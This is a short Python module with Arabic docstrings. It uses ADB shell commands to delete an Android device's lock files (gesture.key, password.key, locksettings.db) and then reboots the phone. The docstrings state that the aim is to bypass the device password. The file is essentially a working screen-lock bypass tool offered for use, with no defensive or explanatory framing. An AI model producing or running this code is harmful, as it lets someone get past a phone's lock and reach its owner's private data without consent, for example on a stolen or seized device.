import os
from adb_utils import execute_adb_command

def delete_lock_files(device_id):
    """
    حذف ملفات القفل لتخطي كلمة مرور الجهاز.
    :param device_id: معرف الجهاز (serial number).
    :return: رسالة النجاح أو الخطأ.
    """
    lock_files = [
        "/data/system/gesture.key",
        "/data/system/password.key",
        "/data/system/locksettings.db"
    ]
    results = []
    for lock_file in lock_files:
        result = execute_adb_command(["-s", device_id, "shell", "rm", lock_file])
        results.append(f"{lock_file}: {result}")
    return "\n".join(results)

def reboot_after_bypass(device_id):
    """
    إعادة تشغيل الجهاز بعد تنفيذ عملية التخطي.
    :param device_id: معرف الجهاز (serial number).
    :return: رسالة النجاح أو الخطأ.
    """
    return execute_adb_command(["-s", device_id, "reboot"])
